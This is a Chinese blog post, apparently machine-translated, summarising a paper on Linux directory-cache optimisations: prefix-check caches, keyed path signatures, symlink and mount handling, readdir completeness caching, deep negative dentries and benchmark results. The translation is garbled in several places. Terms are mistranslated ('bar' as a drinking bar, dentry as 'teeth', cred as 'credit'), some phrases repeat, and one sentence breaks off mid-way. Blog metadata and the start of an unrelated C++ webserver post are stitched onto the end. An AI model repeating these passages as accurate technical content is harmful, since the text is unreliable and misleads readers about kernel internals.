Unix的语义允许人们cd进入一个目录，并在随后的权限改变后继续在该目录中工作，否则将禁止进一步访问。例如，假设一个进程在工作目录&#x2F;foo&#x2F;bar中，foo的权限发生了变化，使得该进程在未来不能进入bar。只要该进程不离开该目录或退出，该进程就应该能够继续打开bar下的文件。类似的语义也适用于打开的目录柄。在我们的设计中，这样的权限变化最终会导致一个被封锁的PCC条目，而快速路径查询将违反预期行为。我们的设计通过检查 打开的引用在PCC中是否仍然被允许。如果PCC有一个 更多的条目，将阻止重新打开这个句柄、查询将被强制采用慢速路径，并且这个陈旧的结果不会被添加到PCC中。结果不会被添加到PCC中。 Accelerating Lookuos with Signatures我们优化的查找使用240位签名来最小化密钥比较的成本。Linux通过链接在哈希表中查找dentry。当哈希表键是一个相对较短的路径组件时，简单地比较键的成本是可以接受的。但是，Linux上的完整路径最多可以有4,096个字符，即使比较中等长度的字符串也会损害直接查找的算法优势。我们可以通过创建路径的签名来避免这个开销，这样可以最小化键比较的开销。 使用签名会带来冲突的风险，这可能导致系统将路径映射到错误的入口。 我们首先解释签名碰撞如何在我们的设计中导致问题，然后解释所需的抗碰撞属性，最后解释我们如何选择签名大小以使这种风险最小化。 Signature collisions 当用户查找路径时，我们的设计首先计算规范化路径的签名，在全局DLHT中查找散列，如果DLHT中有命中，则在每个凭据PCC中查找dentry和序列号。 如果具有相同签名的另一个文件的dentry已经在DLHT中，并且该dentry在PCC中，则用户可能打开错误的文件。例如，如果Alice打开了带有X签名的文件/home/alice/foo，然后打开了同样带有X签名的文件/home/alice/bar，她的第二次打开实际上会创建一个文件foo的句柄。这就产生了一种担忧，即用户可能会由于自己的过错而损坏自己的文件。可以根据签名大小将此风险配置为非常小(下面将讨论)。 任何不正确的查找结果必须是进程(或具有相同凭据的另一个进程)有权访问的文件。要使快速路径查找返回任何内容，必须在任务的PCC中有匹配的dentry指针，该PCC对于具有相同凭据的任务是私有的。因此，碰撞不会导致Alice意外打开属于Bob的完全不相关的文件，否则她无法访问这些文件。 我们的设计正确地处理了两个用户使用相同签名访问不同文件的情况，因为PCC中的错误将导致两个用户都退回到慢路径。 假设Bob开了foo，它和Alice的酒吧相撞了。当Alice打开bar时，它的签名将在DLHT中匹配，但在PCC中会丢失。这将导致Alice的查找以慢路径重新执行前缀检查，最终打开正确的文件并将此条目添加到她的PCC中。 因此，如果Bob是对抗性的，他就不能通过改变缓存内部状态导致Alice打开错误的文件。 我们在启动时为签名哈希函数选择一个随机密钥，以降低确定性错误或离线冲突生成的风险，因为人们可能会使用这些错误来攻击基于用户输入打开文件的应用程序，例如web服务器。因此，相同的路径不会跨重启或相同内核的实例生成相同的签名。 尽管采取了所有这些措施，但对于以root身份运行的应用程序来说，这种风险仍然是不可接受的，因为它可以打开任何文件，特别是那些接受来自不受信任用户的输入的文件。 例如，假设恶意用户识别了一个与密码数据库具有相同签名的路径。该用户可以将此路径传递给setuid-root实用程序，并欺骗setuid实用程序覆盖密码数据库。通过不允许对特权二进制文件或对安全敏感的路径名进行基于签名的查找加速，可以消除这种风险，尽管这在我们的原型中没有实现。 Collision Resistance Requirement 我们设计的安全性取决于对手只能通过蛮力找到碰撞。我们的设计可以使用2通用哈希函数或伪随机函数族(PRF)来生成路径签名。在抗碰撞方面，2-universal hash散列和PRF之间的区别在于，攻击者可以通过观察2-universal hash函数的输出来学习密钥，但不能从PRF的输出中学习密钥。因为我们的dcache设计不向用户显示签名，只显示两条路径是否有签名冲突，所以任何一个族的散列函数都足够了。 需要注意的是，使用双通用哈希函数时，必须小心计时和其他侧通道不会泄漏签名。例如，不能同时使用签名中的位来索引哈希表，因为可能会通过测量在给定哈希桶上遍历链的时间来了解签名的位。在我们选择的函数中，可以安全地使用256位哈希输出中的较低位，因为在我们的特定算法中，较低位不受较高位值的影响;因此，我们使用16位哈希表索引和240位签名。相反，当使用PRF生成签名时，可以避免从侧通道学习签名的问题。 我们的设计使用了2-universal multilinear hash函数。我们使用基于AES-NI硬件的prf做了几个实验，但没有找到一个足够快的函数来改进基线Linux。使用当前的128位AES硬件，我们可以提高4个或更多路径组件的性能，但是创建256位PRF需要更复杂的构造，这太昂贵了。更谨慎的实现可能更倾向于使用PRF，以避免任何被忽略的侧通道风险，特别是如果在未来几代硬件中可以使用快速的256位PRF。 Probability of a signature collision 我们选择了一个240位的签名，它与重复数据删除系统中使用的签名大小相当，范围从128位到256位。 重复数据删除设计通常选择一个签名大小，该签名大小引入的冲突风险大大小于未检测到的ECC RAM错误的风险。 我们假设对手正在用蛮力寻找碰撞。攻击者必须查找系统上的路径，例如通过打开本地文件或查询web服务器上的路径。因为我们的哈希函数是用一个随机值作为键的，并且输出对用户是隐藏的，所以攻击者只能在目标系统上搜索冲突。因此，攻击者受到系统上的查找速率以及目标系统在缓存中保存多个签名以供比较的能力的限制。 我们计算碰撞风险变得不可忽略(即高于2^-128)的预期时间，并对碰撞风险建模如下。首先，|H(X)| &#x3D; 2^240是可能的签名数。我们将缓存限制为n &#x3D; 2^35个条目(即，假设RAM中的dcache空间为10TB，每个条目为320字节)，并采用LRU替换策略。我们计算碰撞风险大于P &#x3D; 2^−128的查询次数(q)如下: 以每秒1000亿次的查找速度(目前的核每秒可以查找大约300万次)，强力碰撞的概率超过2^-128的预期时间是4.8万年 Generalizing the Fast Path到目前为止，我们已经使用相对简单的规范路径名解释了快速路径优化。 本节解释如何将这些优化与Linux的高级安全模块集成，以及如何处理Unix路径语义中的一些边缘情况，例如挂载选项、挂载别名和符号链接。 Generalizing CredentialsLinux包括一个可扩展的安全模块框架(LSMs)， SELinux、AppArmor等都是在此基础上构建的。LSM可以覆盖搜索权限检查的实现，检查目录层次结构或进程的自定义属性。因此，即使LSM覆盖了默认的访问控制规则，我们的dcache优化也必须能够正常工作。 我们的方法利用了Linux中的credit结构，该结构旨在存储进程(任务结构)的凭据，并具有几个有用的属性。首先，信用结构是全面的，包括影响默认权限的所有变量，并包括LSM存储元数据的不透明安全指针。其次，信用是写时复制(copy-on-write, COW)，因此当进程更改其凭据时，例如通过执行setuid二进制文件或更改SELinux中的角色，信用将被复制。我们手动检查了AppArmor和SELinux对私有元数据的更改是否遵守COW约定。此外，在常见情况下，一个信用可以被进程共享，例如一个shell脚本分支子进程具有相同的信用。 因此，cred结构满足了我们的大部分需求，只有一些变化，我们将在下面解释。 我们在每个信用结构中存储缓存的前缀检查(§3.1)，将前缀检查结果与不可变凭证耦合在一起。使用空PCC初始化新的信用结构。当更多进程共享PCC时，它们可以进一步减少慢路径查找的数量。 一个挑战是，即使凭证没有更改，Linux也经常分配新的信用结构。潜在的问题是，COW行为不是在页表中实现的，而是在可能修改信用的代码中按照约定实现的。在许多情况下，例如在exec中，只需提前分配另一个信用，而不是确定凭据是否将被更改，这要简单得多。这种自由分配新凭据的方式造成了在具有相同凭据的子进程之间重用前缀缓存项的问题。为了缓解这个问题，我们等待，直到一个新的信用被应用到一个进程(提交信用())。如果信用的内容没有改变，旧的信用和PCC被重用和共享。 我们的信用方法记忆了不同lsm的复杂和可能任意的权限评估函数。 Non-Canonical Paths and Symbolic Links我们的优化哈希表是以全路径为键。然而，用户可以指定一个路径的变体，例如/X/Y/./Z代表/X/Y/Z。简单的变化在散列过程中很容易被规范化。一个更复杂的情况是，如果&#x2F;X&#x2F;L是一个符号链接，路径/X/L/.../Y可以映射到&#x2F;X&#x2F;Y以外的路径。同样，如果用户没有搜索/X/Z的权限，即使用户有搜索/X/Y的权限，对/X/Z/.../Y的查询也应该失败。为了保持与Linux的bug-for-bug兼容，我们的原型在每个点上都会发出一个额外的fastpath查询来检查权限。保持Unix的语义会给非经典的 路径的开销。我们发现使用Plan 9的词法路径语义。Plan 9通过预处理，将网络文件 通过对/X/L/.../Y这样的路径进行预处理，将网络文件系统的查询降到最低。到/X/Y。我们注意到，Plan 9在每次查找组件时都会进行 查询，但没有目录缓存。 Symbollic Links 我们在我们的查询中解决符号链接 我们通过为符号链接创建dentry aliases来解决符号链接。例如 例如，如果路径/X/L是/X/Y的别名，我们的内核会 创建dentries，将/X/L/Z重定向到/X/Y/Z。换句话说，符号链接被视为一种特殊的目录类型、 并可以创建子目录，对翻译进行缓存。 符号链接dentries存储240位的签名，代表目标路径。代表目标路径。PCC是单独检查 为目标目录。如果一个符号链接发生变化，我们必须 无效所有的后继别名，类似于目录重命名的无效化。目录重命名(rename)。这种重定向可以无缝地处理 的情况，即在翻译的路径上发生权限变化 路径上的权限变化，或者被引用的目录被删除以回收空间。 Mount Point我们的快速路径处理由挂载点引入的几个微妙的边缘情况。 Mount options 挂载选项(如read-only或nosuid)会影响文件访问权限检查。Linux dcache通常将挂载点作为分层文件系统遍历的一部分，并内联检查与权限相关的挂载标志。一旦消除了这种自上而下的行走，我们需要能够识别任何给定牙齿的当前挂载点。目前我们为每个dentry添加了一个指针，尽管可能有更节省空间的选项。 Mount Aliases 一些伪文件系统，如proc、dev和sysfs，可以在多个位置挂载相同的实例。chroot环境使用该特性，并在引导期间移动这些文件系统。绑定挂载还可以创建挂载别名。 在我们的系统中，一个dentry只存储一个签名，并且一次只能通过一个路径在直接查找哈希表中。我们目前的设计只是选择最近的优化位置。如果慢路径遍历注意到匹配的dentry(按路径)有不同的签名，在别名挂载下，并且已经在DLHT中，那么慢路径将替换签名，增加dentry版本计数，并更新指向该dentry挂载点的指针。 如果别名路径有不同的前缀检查结果，则需要增加版本计数。这种方法确保了所有情况下的正确性，并且对于任何挂载别名的入口，在最近使用的路径上都具有良好的性能。 Mount Namespaces Linux中的挂载namespace允许进程创建私有挂载点，包括chroot环境，这些挂载点仅对进程及其后代可见。当进程创建一个新的挂载namespace时，它还分配一个新的、namespace-private的直接查找哈希表。slowpath总是包含任何挂载重定向，并且任何新的签名到dentry映射在名称空间中都是正确的。因此，名称空间内部的相同路径(和签名)将映射到不同于名称空间外部的dentry。类似地，前缀检查缓存(PCC)在名称空间中始终是私有的。 与挂载别名(Mount Aliases)一样，我们一次只允许一个dentry存在于一个直接查找哈希表上。这有利于局部性，并且当重命名的目录跨多个namespace共享时，使无效任务易于处理。用于目录树修改的无效代码只是将每个子条目从当前存储的DLHT中移除 Network File Systems 我们的原型不支持在网络文件系统上直接查找，例如NFS版本2和3。为了在无状态协议上实现从近到开的一致性，客户端必须在服务器上重新验证所有路径组件——有效地强制缓存丢失，并使命中路径的任何好处无效。我们期望这些优化可以使具有目录修改回调的有状态协议受益，例如AFS或NFS 4.1。 Summary本节演示我们的目录缓存优化如何支持Linux在目录缓存上构建的各种特性，包括名称空间、增强的安全模块和符号链接。我们的原型主要集中在Linux上，可以说Linux的特性与目录缓存交织在一起，但是我们相信这些优化在其他系统上也可以工作，只需要适当的移植工作。 我们的设计有以下要求，我们期望任何posix兼容的目录缓存都能满足这些要求。 首先，POSIX权限语义要求对从当前根目录或工作目录到文件的路径进行目录访问检查(即前缀检查);我们的实现继承了Linux的不变量，即任何缓存目录的父目录都在缓存中，但是任何可以实现前缀检查的设计都应该足够了。其次，我们要求，如果一个目录的权限改变，有一个程序化的方式来找到所有的后代在缓存中(§3.2)。我们的实现集成了Linux dcache中的乐观同步，以获得良好的性能和一致性，但这种设计可以集成任何合理的同步方案，例如FreeBSD的读&#x2F;写锁。最后，我们利用Linux具有不可变凭证结构的事实(§4.1);适应可变的或不太统一的凭证将需要额外的工作。 Improving the Hit Rate前几节解释了dcache结构的变化如何通过算法改进来降低平均命中延迟。本节将介绍几个可以提高命中率的简单更改。在dcache丢失的情况下，低级文件系统被调用来为系统调用提供服务。在最好的情况下，磁盘上的元数据格式仍在页缓存中，但必须转换为通用格式;在最坏的情况下，请求阻塞在磁盘I&#x2F;O上。虽然并不是每个应用程序都以非常低的命中率大量使用这些情况，但评估显示有几个广泛使用的应用程序从这些优化中受益匪浅。 Caching Directory Completeness尽管Linux dcache跟踪目录的层次结构，但它并不知道目录的内容是全部还是部分在缓存中。假设Alice在本地文件系统上创建了一个新目录X;如果她的下一个系统调用试图创建文件X/Y，则dcache将错过此查找，并询问低级文件系统是否存在X/Y。如果VFS跟踪所有目录内容都在缓存中，则可以避免这种开销。 第二个例子是readdir，它列出目录中的文件，以及它们的inode号和类型，比如普通文件、字符设备、目录或符号链接。在当前的VFS readdir操作中，总是调用底层文件系统，即使整个目录都在缓存中。对于大到无法在用户提供的缓冲区中列出的目录，可以多次调用readdir，将偏移量存储到目录中。为了构造这个清单，底层文件系统必须重新解析和转换磁盘上的格式，并且可能需要将元数据块从磁盘读入缓冲区缓存。因此，readdir通常是一个昂贵的文件系统操作，特别是对于大型目录。 我们注意到，重复列出目录是文件系统中的常见行为。例如，用户或shell脚本可以在一个目录中重复运行ls命令。一些应用程序通过目录内容协调状态，需要频繁和重复的目录列表。例如，maildir是一种流行的电子邮件后端存储格式，它比旧的mbox格式产生更好的性能可伸缩性。maildir将每个收件箱或子文件夹存储为一个目录，每个单独的邮件都是该目录中的一个文件。文件名编码属性，包括标志和读&#x2F;未读状态。如果消息改变了状态，例如通过删除或标记为已读，IMAP服务器服务器将重命名或取消该文件的链接，并重新读取目录以同步邮件列表。类似地，作为单独进程运行的邮件传递代理(MDA)可以并发地将新消息写入目录，这要求IMAP服务器监视目录的更改，并定期重新读取目录的内容。 我们的Linux变体将低级文件系统返回的readdir结果缓存在目录缓存中。如果目录的所有子目录都在缓存中，则用新的DIR COMPLETE标志标记dentry。这个标志是在创建新目录(mkdir)时设置的，或者在一系列readdir系统调用完成时，没有在目录句柄上执行lseek()操作，也没有并发清除任何子目录以回收空间。我们注意到，并发文件的创建或删除与一系列readdir交织在一起，仍然会在缓存中，并产生正确的列表结果。在设置了DIR COMPLETE标志之后，后续的读DIR请求将直接从dentry的子列表中得到服务。一旦目录进入完整状态，只有在从缓存中删除子条目以回收空间时，它才会离开此状态。 这种方法需要注意的一点是，readdir返回通常会出现在inode中的部分信息，但不足以创建完整的inode。对于这些文件或子目录，我们添加不带inode的dentry作为目录的子目录。这些dentry在查找时必须与阴性dentry分开，并与适当的索引节点链接。这种方法允许将readdir结果用于后续查找，干净地与现有的dcache机制集成，并从每个磁盘I&#x2F;O中获得最大可能的用途，而不会引起不必要的I&#x2F;O。 我们注意到Solaris包含一个类似的完整目录缓存模式[25]，但它没有与readdir或查找以外的调用集成，是一个单独的缓存(因此相同的dentry可以存储两次，并且在丢失之前必须检查两个散列表)，并且注释表明它仅对大型目录具有性能价值。我们的结果表明，当适当地集成到目录缓存中时，跟踪完整的目录比以前认为的更有价值。 File Creation 目录完整性缓存还可以避免新文件创建时的强制遗漏。尽管负dentry缓存对于不存在的特定文件的重复查询效果很好，但是当应用程序请求不存在的不同文件时，负dentry的效果就不那么好了。 不可预测查找的一个常见示例来自安全临时文件创建实用程序。在我们的原型中，带有DIR_COMPLETED标志的目录下的缺失被视为发现了negative dentry，从而忽略了这种强制缺失。在我们当前的实现中，该标志只会在已读取或新创建的目录中设置，但其他用于检测频繁的negative dentry缺失和加载目录的启发式方法可能也很有用. Aggressive Negative Cachingnegative dentries缓存磁盘上不存在的路径。本小节确定了几个更积极地使用负检索的机会，其中一些与直接查找协同工作 Renaming and Deletion 当文件被重命名或解除链接时，可以将旧路径转换为negative dentry。 虽然Linux会在取消链接时将缓存的但未使用的dentry转换为negative dentry，但对于仍在使用的文件的重命名和取消链接来说，情况并非如此。我们扩展了这些例程，以便在删除文件后保留负记录，以便以后重用该路径，就像创建锁文件或Emacs的备份(“波浪”)文件一样 Pseudo File Systems 伪文件系统，如proc、sys和dev，不会为搜索到的不存在的路径创建negative dentry。这是一种基于以下观察的简化:磁盘I&#x2F;O永远不会涉及到遗漏。因为我们的快速路径仍然比遗漏快得多，negative dentry甚至对内存中的文件系统也是有益的，可以加速查找不存在的频繁搜索文件。 Deep Negative Dentries 最后，我们扩展了直接查找快速路径(§3)，使其能够创建“深度”负输入。考虑这样一种情况:用户试图打开/X/Y/Z/A，而/X/Y/Z不存在。在慢路径中，查找将在找到第一个缺失的组件时失败，只缓存z的负条目就足够了。然而，对该路径的重复查找将永远不会找到快速路径，因为没有完整路径的条目。 为了在这种情况下使用快速路径，我们允许负面dentries创建负面子节点，以及深层子节点。 换句话说，我们允许negative dentry /X/Y/Z创建子节点A和A/B，它们可以服务于对不存在的路径的重复请求。如果为缓存为负的路径创建文件，并且该文件不是目录，则会从缓存中清除任何负的子文件。 我们还在常规文件下创建深度negative dentry，以捕获返回ENOTDIR而不是ENOENT的查找失败。当将文件名当作目录使用时，就会出现这种查找失败，并且搜索其下的路径。例如，如果/X/Y/Z是一个常规文件，并且用户搜索/X/Y/Z/A, Linux内核将返回ENOTDIR，并且永远不会创建negative dentry。我们用一个deep,ENOTDIR优化这个案例。 Evaluation本节评估我们的目录缓存优化，并试图回答以下问题: 每种优化(查找快速路径、全目录缓存和更激进的negative dentries)对应用程序性能的改善有多大? 采用这些更改有多困难，特别是对于单个文件系统? 评估包括微基准测试，用于测量在最佳情况和最坏情况下与文件系统相关的系统调用的延迟，以及选择实际应用程序，以显示我们的解决方案在实践中可能提高的性能。 所有的实验结果都收集在一台Supermicro超级服务器上，该服务器配备了12核2.40GHz的英特尔Core Xeon CPU、 64GB内存，和一个2TB，7200 RPM的ATA磁盘，格式化为日记式的ext4文件系统，配置为4096 字节块大小。操作系统是Ubuntu 14.04服务器，Linux内核 3.14. 所有的测量结果都是至少6次运行的平均值（对于运行时间较长的实验）；大多数测量是数百或数千次的运行，以确保一致的平均数。表格和图表表明95%的置信区间 用 “+&#x2F;-“列或误差条表示。 File Lookup OptimizationMicro-benchmarks我们使用扩展的LMBench 2.5 UNIX微基准套件来评估系统调用级别的路径查找延迟。图6显示了stat和open具有各种特征的示例路径的延迟，这些特征包括不同的长度、符号链接、父目录(dot dot)和未找到的文件。 我们观察到的主要趋势是，当路径有更多的组件时，我们的优化的相对增益就会增加。 对于单个组件文件，stat获得3%的收益，而open与基线Linux相当。对于更长的路径，增益分别增加到26%和12%。 为了评估最坏的情况，我们包括一组标有 “fastpath miss + slowpath “的条形图，它行使了快速路径代码，但是内核被配置为在PCC中总是miss。这模拟了执行优化的快速路径不成功，然后在缓存中走O(n)慢速路径的全部成本。这种情况下，不会一直错过到低级文件系统。开销通常在12-93%之间，除了路径neg-d。在neg-d的情况下，第一个组件是缺失的，一个组件一个时间的行走会比直接查找更快停止。一般来说，neg-d的情况会通过deep negative dentries来缓解。在实践中，这些开销只有在高速缓存中的强制缺失时才会被观察到，或者由一个表现出极度缺乏定位性的应用来观察。 接下来，我们比较默认Linux父级(“dot dot”)语义与Plan 9的词法语义的成本。对带有父引用的路径强制执行Linux语义导致我们的优化性能比未修改的Linux差大约31%，因为这需要对每个父节点进行额外的查找。另一方面，词法路径语义允许我们继续使用单个查找进行优化，从而将性能提高43-52%。词法路径语义有一个独立的好处，可以减少在未修改的Linux中查找时需要遍历的组件数量。尽管这个差异很大，但是我们的测试应用程序并没有大量使用父目录指针，并且对这个差异并不敏感。 缓存符号链接的分辨率可使路径link-f和link-d的性能分别提高44%和48%。这种改进对链接发生在路径中的位置不敏感，因为link-f和link-d都遍历相同数量的组件(link-d将“LLL”映射到“XXX”)。 对于不存在的文件(negative dentries)，我们看到了与现有路径类似的改进。唯一的例外是路径早期目录下不存在的长路径。我们认为这种情况很少见，因为应用程序通常是自顶向下遍历目录树，而不是跳到一个不存在的目录。在这种情况下(path neg-d)，基线Linux停止处理路径的速度比我们的优化散列整个路径的速度要快，即使缓存deep negative dentries也是如此。尽管如此，deep negative dentries是一个重要的优化:没有它们，path neg-d的状态将比未修改的Linux差113%，open将差43%，而deep negative dentries则慢38%和16%。 Linux还包括*at()系统调用变体，它们在工作目录下操作—通常只使用单个组件。与上面的结果相对应，对于单个路径组件，fstatat()从我们的优化中获益12%，openat()比未修改的Linux快4%。一些应用程序将多个组件名称与*at调用结合使用;在这些情况下，优化的好处与路径长度成正比。 为了评估更新目录权限和改变目录结构的开销，我们测量chmod和重命名的延迟。在我们的解决方案中，影响这些开销的主要因素是缓存中的子目录数量（缓存外的目录子目录不会影响性能）。图7显示了不同深度和目录大小的目录上的chmod和重命名的性能。一般来说，重命名或chmod的成本随着子目录数量的增加而急剧增加，而基线Linux和ext4使这些操作的时间不变。即使有10,000个子目录都在缓存中，最坏的情况下的延迟也在330微秒左右。作为一个参考点，Linux 3.19源树包括51,562个文件和目录。几个Linux文件系统维护者的初步反馈表明 这种交易对于提高查询性能是可以接受的。 Space Overhead 我们的原型将dentry的大小从192字节增加到280字节。我们的设计还引入了大小为64 KB的每个凭据的PCC和第二个全局散列表(DLHT)，其中包括2^16个bucket。由于Linux没有对dcache大小施加任何硬限制(除了在内存压力下的极端情况)，因此很难标准化执行时间来考虑空间成本。在一个典型的系统上，dcache是几十到几百MB;将其增加50%可能在系统总内存的可接受范围内。或者，如果要限制总dcache大小，则会在更快的命中和更少的命中之间进行权衡。我们把这些权衡的探索留给未来的工作。 Scalability 图8显示了当系统上执行更多线程时，在同一路径上执行stat/open操作的延迟。在Linux上，查找的读端已经是线性可伸缩的，我们的优化并没有破坏这一趋势——只是提高了延迟。rename系统调用引入了显著的争用，并且在基线Linux中可伸缩性较差。例如，在我们 Caching Directory Completeness 图9显示了不同目录大小的readdir微基准测试的延迟。缓存readdir结果的能力提高了46-74%的性能。随着目录变大，缓存的帮助越来越大。OpenSolaris的注释表明，这个想法只对UFS中至少有1,024个条目的目录有利。我们的结果表明，即使只有10个子目录也有好处。 图9还显示了在不同大小的目录中创建一个安全的、随机命名的文件的延迟。我们对mkstemp库进行了1-8%的改进。尽管大多数应用程序的执行时间并不被安全文件的创建所支配，但它是许多应用程序的一项常见任务，而且边际成本低。 ApplicationsCommand-Line Applications 当然，应用程序从更快的查找中获得的改进与发出基于路径的系统调用所花费的运行时时间比例以及列出目录的时间数量成正比。我们测量一系列常用应用程序的性能。 在大多数情况下，这些应用程序从这些优化中受益匪浅;在最坏的情况下，性能损害是最小的。我们用于基准测试的应用程序包括: find:在Linux源目录中搜索文件名。 tar xzf:解压并解包Linux源代码。 rm -r:删除Linux源树。 make和make -j12:编译Linux内核。 du -s:在Linux源代码中递归列出目录大小。 updatedb:从一个干净的debootstrap中重建&#x2F;usr中常用搜索文件名的规范路径数据库。 git status和git diff:显示克隆的Linux内核git库的状态和未分级的更改 对于我们测试的每个应用程序，我们在热缓存(表1)和冷缓存(表2)两种情况下评估性能。为了热缓存，我们运行一次实验并放弃第一次运行。对于热缓存测试，我们还提供了每个应用程序的路径特征的统计信息。 也许不足为奇的是，元数据密集型工作负载从我们的优化中获益最多，例如find和updatedb，速度可提高29%。注意，find、updatedb和du只使用*at() api，并且所有路径都是单组件;这些收益可归因于查找和目录完整性缓存的改进。 我们注意到目录搜索工作负载的性能对PCC的大小很敏感;当我们在一个比PCC大两倍的目录树上运行updatedb时，增益从29%下降到16.5%。这是因为在新访问的目录中，越来越多的第一次查找将不得不采用慢路径。 我们的原型有一个静态设置的PCC大小，我们用一个足够大的PCC进行评估，以便在温暖的缓存实验中缓存大多数相关的目录。我们希望一个生产系统能够动态地调整PCC的大小，使其达到最大的工作集；我们将研究一个适当的策略来决定何时增加PCC和驱逐条目的问题留待今后的工作中解决。 我们的命中优化主要改进的应用程序是git，它显示了4-9.9%的增益。由其他计算主导的情况，例如Linux编译，显示最小(≤2.3%的减速)。在冷缓存的情况下，所有的增益或损失都大致在实验噪声范围内，这表明这些优化不太可能对在冷系统上运行的应用程序造成损害。总的来说，这些结果肯定了普通的Linux应用程序不会因为我们的优化而受到损害，而且可以从中获得实质性的好处。 表1还显示了未修改Linux上这些工作负载的统计信息。一般来说，每个路径组件大约有8个字符，基于*at的应用程序通常查找单组件路径，而其他应用程序通常查找3-4个组件。我们的统计数据还表明，使用热缓存时，这些应用程序在缓存中应该看到84 - 100%的命中率，因此优化命中路径对性能至关重要。最后，make是唯一具有显著负dentries比例(大约20%)的应用程序，这是意料之中的，因为它正在创建新的二进制文件。 Server Applications 一个经常使用readdir的软件示例是使用MailDir存储格式的IMAP邮件服务器。我们通过为客户机创建10个邮箱来测试Dovecot IMAP服务器。我们使用客户端脚本随机选择不同邮箱中的消息，并将其标记为已读、已标记或未标记。在内部，标记邮件会导致重命名文件，并重新读取目录。为了消除网络延迟，我们在本地主机上运行网络测试;在实际部署中，网络延迟可能会掩盖客户端的这些改进，但服务器的负载仍然会减少。 图10显示了Dovecot邮件服务器在两个内核上的吞吐量。在两个内核上的吞吐量；改进范围为7.8-12.2%。与readdir微基准相呼应，较大的 目录通常会有更大的改善，在10%的收益中趋于平稳。我们同样使用Apache基准测试来锻炼Apache网络服务器生成文件列表的能力（表3）。这些页面没有被Apache缓存，而是为每个请求动态地生成。总的来说，这些结果表明，readdir缓存策略可以减少服务器的负载或提高服务器的吞吐量。 Code Changes为了估计采用的难度，表4列出了Linux原型中更改的代码行。所需的绝大多数更改(大约1,000个LoC)是本地化到dcache本身的钩子(dcache.c和name .c);大多数这些优化都在一组单独的文件中，总计约2,400个LoC。此外，我们测试的低级文件系统不需要任何更改就可以使用修改后的目录缓存。对其他子系统的主要影响实际上是对lsm的影响，这需要一些更改来正确地管理pcc。因此，采用其他内核子系统的负担非常小。 Discussion and Future Work如果愿意牺牲完全向后兼容性来最大化查找性能，那么改进的主要机会实际上可能是为基于路径的调用设计一个更简单的接口。 正如上面的评价所示，在这种设计中，有几个Linux&#x2F;POSIX特性的支持成本过高。例如，实现Plan 9风格的词法路径语义可以显著改善查找带有“dot dot”的路径。类似地，工作目录语义要求慢路径遍历。可以说，在这些点上，特定的实现选择已经“泄露”到接口规范中，并且这些特性限制了支持数据结构的选择。我们建议使用尽可能简单和无状态的接口;这个建议与其他关于可伸缩性的建议一致。 Linux静态地选择哈希表中的buckets数(默认情况下为262,144)。如果没有很好地选择这个数字，或者需求随着时间的推移而变化，则会浪费空间或bucket链变长，从而损害查找性能。 在我们的测试系统中，58%的bucket是空的，34%有一个条目，7%有两个条目，1%有3-10个条目，这表明有机会改进查找时间和空间使用。近年来开发了许多高性能哈希表，它们对搜索时间和浪费的空间施加了恒定的限制。 Related Work大多数提高目录缓存效率的相关工作都是针对两个相互正交的问题:减少丢失延迟和预取条目。最类似于我们记忆前缀检查结果的优化，SQL Server缓存对象最近访问控制检查的结果。 Reducing Miss Latency 减少遗漏延迟的一个相关策略是将所有要查找的组件一次性传递给低级文件系统，本质上是创建一个预取提示。一些网络文件系统已经观察到，组件一次查找会为每个组件生成一条往返消息，而更有效的策略是将一个消息中的挂载点下的所有组件传递给服务器进行查找。类似的论点也适用于本地文件系统，通过知道完整的查找目标，可以更有效地从磁盘获取元数据索引。因此，Windows NT和Solaris采用了这种分工。需要注意的是，如果不将其作为预取“提示”，这可能会将大量VFS功能推入每个低级文件系统，例如处理挂载点的重定向、符号链接和权限检查。Chen等人注意到，将权限检查从VFS层向下推到单个文件系统是Linux中难以防止的内核bug的一个重要来源。相比之下，这个项目缓存先前的前缀检查结果，以减少内存中已经存在的路径的命中延迟，而不是使用完整路径作为预取提示。 另一种普遍存在的延迟减少策略是将元数据持久地存储在散列表中。为了减少网络流量，一些分布式文件系统、集群环境和基于云的应用程序已经使用元数据散列来确定地将元数据映射到节点，从而消除了对目录服务的需求。直接查找文件系统(Direct Lookup File System, DLFS)本质上是将整个磁盘组织成一个哈希表，按照文件系统内的路径进行键控，以便查找只有一个I&#x2F;O的文件。将磁盘组织为散列表会带来一些挑战，例如将目录重命名转换为数据和元数据的深度递归副本。DLFS通过将父权限表示为封闭形式表达式来解决前缀检查问题;这种方法本质上是硬编码传统的Unix自由访问控制，并且不容易扩展到Linux安全模块。我们工作的一个重要见解是，内存中的全路径哈希，而不是磁盘上的，可以实现类似的性能提升，但没有这些可用性问题，例如重命名时的深度目录复制或更新子目录权限时容易出错的启发式方法。 VFS Cache Profetching 一些文件系统优化了readdir后跟stat以访问子目录元数据的情况，例如使用ls -l命令。当请求读取目录时，这些低级文件系统推测性地将文件索引节点(通常位于相对较近的磁盘扇区)读取到私有内存缓存中，随后的查找或stat请求将从该缓存中得到服务。类似地，NFS版本2协议包括一个READDIRPLUS操作，它在一次消息往返中请求所有子节点的目录内容和属性。这些文件系统必须实现它们自己的启发式方法来管理这个缓存。预取与我们的工作是正交的，它更有效地缓存已经从低级文件系统请求的内容。 Conclusion本文提出了一种目录缓存设计，可以有效地将文件路径映射到操作系统内核中的内存数据结构。我们的设计将目录缓存分解为单独的缓存，用于权限检查和路径索引，支持单步路径查找，并促进基于签名和缓存符号链接解析的新优化。对于经常与文件系统目录树交互的应用程序，这些优化最多可以将性能提高29%。我们的优化保持了与一系列应用程序和内核扩展的兼容性，使它们适合实际部署。","categories":[{"name":"论文精读","slug":"论文精读","permalink":"http://example.com/categories/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB/"},{"name":"内核安全","slug":"论文精读/内核安全","permalink":"http://example.com/categories/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB/%E5%86%85%E6%A0%B8%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"文件系统","slug":"文件系统","permalink":"http://example.com/tags/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"}]},{"title":"C++学习 项目实战 webserver","slug":"C++-学习-项目实战-webserver","date":"2023-06-05T04:43:53.000Z","updated":"2023-07-28T09:36:40.372Z","comments":true,"path":"2023/06/05/C++-学习-项目实战-webserver/","link":"","permalink":"http://example.com/2023/06/05/C++-%E5%AD%A6%E4%B9%A0-%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98-webserver/","excerpt":"阻塞和非阻塞、同步和异步（网络IO）典型的一次IO的两个阶段是什么？ 数据就绪：根据系统IO操作的就绪 阻塞 - 调用IO方法的线程进入阻塞状态 12ssize_t recv(int sockfd, void* buf, size_t 